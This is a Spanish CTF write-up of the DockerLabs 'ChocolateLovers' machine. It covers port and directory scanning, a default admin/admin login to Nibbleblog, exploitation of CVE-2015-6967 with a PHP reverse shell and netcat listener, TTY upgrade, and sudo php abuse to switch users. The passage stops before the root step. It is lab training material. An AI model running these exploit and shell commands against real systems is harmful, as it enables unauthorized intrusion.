---
title: ChocolateLovers - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Facil      | ElPinguinoDeMario | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/1a88e550-b6f6-44b3-a926-36300c052091)


Durante el escaneo, descubrimos que los siguientes puertos están activos:
- `80` (HTTP)

A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.

```bash
nmap -p 80-sCV 172.17.0.2 -oG targeted
```
![image](https://github.com/user-attachments/assets/4e42ce42-8f15-4ffb-b5f6-7c0b43148f2e)


# Exploración Web

Al acceder a la página web, observamos un panel de apache que estan pordefecto. 

![image](https://github.com/user-attachments/assets/0c8ea714-be14-4a40-ab76-f86d94cf2876)


Utilizamos `Gobuster` para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img
```
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.17.0.2/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre

![image](https://github.com/user-attachments/assets/eaadd2b6-622e-4946-b00d-09b348b36ca9)

No encontramos nada por ahi, vamos a darle otro enfoque.

![image](https://github.com/user-attachments/assets/0ea9d0a8-b545-4b7f-844a-89096d3674f1)

En el codigo fuente vemos una ruta un poco extraña, asi que entraremos en ella para ver si encontramos algo.

![image](https://github.com/user-attachments/assets/b4e80b01-4b77-4390-b6a2-cfcc571dfd9e)

Nos redirecciona, y vemos otra ruta la cual llamada `admin.php`.

![image](https://github.com/user-attachments/assets/df5b70eb-2df2-40e7-8d3e-bf69d599fddb)

Al porbar contraseñas por defecto probamos `admin`/`admin` coseguimos acceder.

![image](https://github.com/user-attachments/assets/cd5592ea-31d8-4fd2-834c-f27a794451ea)

Mirando por un poco la pagina podemos ver dentro de la seccion de `settings` al final vemos la version que tienen de ese servicio.

![image](https://github.com/user-attachments/assets/da0af440-72e2-4ad6-9e0f-b7d9a7bc14b7)

Vamos a ver si existe algun exploit de esta version.

![image](https://github.com/user-attachments/assets/a928cf5a-d32c-494a-ba5b-95ef230b1e83)

Existen varios exploits y todos para la version que tenemos nosotros.

![image](https://github.com/user-attachments/assets/1e33f612-aaff-4481-93a1-ba8824a22c11)


## CVE-2015-6967

Usaremos este repositorio de github para explotarlo [CVE-2015-6967](https://github.com/dix0nym/CVE-2015-6967).

![image](https://github.com/user-attachments/assets/ef2fd301-d900-4d9e-a410-9a5757ad042f)

Viendo como funciona el script vemos que funciona a traves de un plugin llamado `my_image`.

![image](https://github.com/user-attachments/assets/bf639fa4-57c7-4d69-bd64-96b417ac3297)

Me da a mi que debriamos de intalarlo ya que el `exploit`, hace uso de ese plugin , pero no veo que nos lo instale.

![image](https://github.com/user-attachments/assets/5614a6c2-1616-4ab4-8ee9-8569d4433bc9)

Ahora vamos a ejecutar el script , para ello antes crearemos nuestra revershell

### Intrusión en la Máquina

Generamos la reverseshell utilizando **Pentest Monkey**, una herramienta popular para crear shells PHP que nos permiten obtener acceso remoto al servidor. La ruta de la reverseshell es la siguiente:

[Reverseshell de Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

Cuando la tengamos solo falta ejecutar el `exploit`, para ello primero descargaremos el repositorio.

```bash
git clone https://github.com/dix0nym/CVE-2015-6967.git
```
![image](https://github.com/user-attachments/assets/961eed03-0f9b-4739-910b-68db1bcb83d0)

Ya que tenemos todo esto vamos ahora a poner el siguiente comando:
```bash
python3 exploit.py --url http://172.17.0.2/nibbleblog/ --username admin --password admin --payload ../shell.php
```
![image](https://github.com/user-attachments/assets/05587267-7e2a-493c-a53d-f8014fa5622f)

Una vez hecho esto si investigamos un poco por la web vemos que en este repositorio estan los plugins http://172.17.0.2/nibbleblog/content/private/plugins/

![image](https://github.com/user-attachments/assets/f5497815-e9bc-4367-9b0f-43be7cc8c2ec)

### Pasos para Cargar la Reverseshell

Nos ponemos a escuchar por netcat en mi caso por el 4444
```bash 
nc -lvnp 4444
```
Luego, accedemos a la ruta de la página web donde hemos cargado la reverseshell, *le damos al archivo llamado `image.php`*:

![image](https://github.com/user-attachments/assets/87fb6f40-fbe1-4394-b1b4-503c15c52bd4)

Y ya tendriamos acceso a la maquina.

![image](https://github.com/user-attachments/assets/63dc6070-4522-4655-9f14-f39f94fa82d5)

## TTY ReverseShell

### Iniciar una sesión de shell interactiva
En nuestra shell básica, ejecutamos el siguiente comando para forzar la creación de una sesión de bash interactiva:
```bash
script /dev/null -c bash
```
### Suspender la shell
Una vez que el comando anterior está en ejecución, utilizamos
```bash
Control+Z
```
para suspender temporalmente nuestra shell.

### Preparar nuestro terminal local:
Antes de volver a nuestra shell, configuramos nuestro terminal local:
```bash
stty raw -echo; fg
```

### Resetear la configuración del terminal
Ahora que tenemos el control de la shell, la reseteamos para asegurar que se comporta correctamente:
```bash
reset
```

### Configura el tipo de terminal:
```bash
xterm
export TERM=xterm
export SHELL=bash
```

# Intrusion

Ya estamos dentro de la máquina. Si ejecutamos el comando `sudo -l`, vemos que podemos ejecutar `php` como `chocolate`. Si no sabemos como abusar de esto, siempre podemos recurrir a [GTFOBins](https://gtfobins.github.io/).

![image](https://github.com/user-attachments/assets/139acb72-7157-4ef0-8099-3a8e6851d7c2)

Para ejecutar una shell como usuario debemos de poner lo siguiente:

```shell
www-data@5a6d69b701d7:/$ CMD="/bin/sh"
www-data@5a6d69b701d7:/$ sudo -u chocolate php -r "system('$CMD');"
```
Si hacesmo un whoami podemos ver que estamos con el usuario chocolate.

![image](https://github.com/user-attachments/assets/f24c07d0-8694-4c64-b01d-caf7347f6b6b)

Vamos a generar una shell interactiva
```bash
script /dev/null -c bash
```
# Accedor Root

Vamos con el final despues de mirar 
